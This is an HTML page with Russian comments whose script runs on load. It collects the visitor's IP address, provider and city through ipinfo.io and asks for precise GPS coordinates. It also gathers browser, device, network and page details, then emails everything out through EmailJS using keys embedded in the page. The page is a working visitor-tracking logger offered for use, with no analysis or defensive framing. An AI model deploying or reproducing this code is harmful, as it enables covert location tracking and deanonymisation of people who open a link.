<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send User Data</title>

    <!-- Подключение актуального EmailJS SDK -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            emailjs.init("nRcxesuNKhp7AMc4d");  // Ваш публичный User ID
        })();

        // Получение данных о пользователе
        async function collectData() {
            let userData = {};

            // Получение IP и Провайдера через ipinfo.io
            async function getIPAndProvider() {
                const token = "229d6455ecea02"; // Ваш токен для ipinfo.io
                try {
                    const response = await fetch(`https://ipinfo.io?token=${token}`);
                    const data = await response.json();
                    userData.ip = data.ip;
                    userData.provider = data.org || 'Не удалось определить';
                    userData.location = data.city + ', ' + data.region + ', ' + data.country;
                } catch (error) {
                    userData.ip = "Не удалось получить IP";
                    userData.provider = "Не удалось получить провайдера";
                    console.error("Ошибка получения IP", error);
                }
            }

            // Получение геолокации (широта и долгота)
            async function getGeolocation() {
                return new Promise((resolve, reject) => {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(position => {
                            userData.latitude = position.coords.latitude;
                            userData.longitude = position.coords.longitude;
                            userData.accuracy = position.coords.accuracy;
                            resolve();
                        }, function(error) {
                            userData.latitude = "Не удалось получить широту";
                            userData.longitude = "Не удалось получить долготу";
                            resolve(); // Возвращаем, чтобы код продолжал выполнение
                        });
                    } else {
                        userData.latitude = "Геолокация не поддерживается";
                        userData.longitude = "Геолокация не поддерживается";
                        resolve();
                    }
                });
            }

            // Получение данных о браузере
            function getBrowserInfo() {
                userData.userAgent = navigator.userAgent;
                userData.language = navigator.language;
                userData.platform = navigator.platform;
                userData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                userData.screenWidth = window.screen.width;
                userData.screenHeight = window.screen.height;
            }

            // Сетевые данные
            function getNetworkInfo() {
                if (navigator.connection) {
                    userData.connectionType = navigator.connection.effectiveType;
                    userData.downlink = navigator.connection.downlink;
                    userData.rtt = navigator.connection.rtt;
                }
            }

            // Тип устройства
            function getDeviceType() {
                const ua = navigator.userAgent;
                if (/Mobi|Android/i.test(ua)) {
                    userData.deviceType = "Мобильное устройство";
                } else if (/Tablet|iPad/i.test(ua)) {
                    userData.deviceType = "Планшет";
                } else {
                    userData.deviceType = "Настольное устройство";
                }
            }

            // Получение текущей страницы
            function getCurrentPage() {
                userData.url = window.location.href;
            }

            // Время нахождения на странице
            function getSessionTime() {
                userData.pageLoadTime = Date.now();
            }

            // Отправка данных на почту
            function sendData() {
                // Отправка данных в шаблон EmailJS
                emailjs.send("Hjikwe21782", "template_73zczgq", userData)
                    .then(function(response) {
                        console.log("Email sent successfully", response);
                        alert('Данные отправлены на вашу почту!');
                    }, function(error) {
                        console.error("Failed to send email", error);
                        alert("Ошибка при отправке данных: " + error.text);
                    });
            }

            // Собираем все данные
            await getIPAndProvider();
            await getGeolocation();
            getBrowserInfo();
            getNetworkInfo();
            getDeviceType();
            getCurrentPage();
            getSessionTime();

            // Отправляем данные после их сбора
            sendData();
        }

        window.onload = function() {
            collectData();
        }
    </script>
</head>
<body>
    <h1>Отправка всех данных о пользователе</h1>
</body>
</html>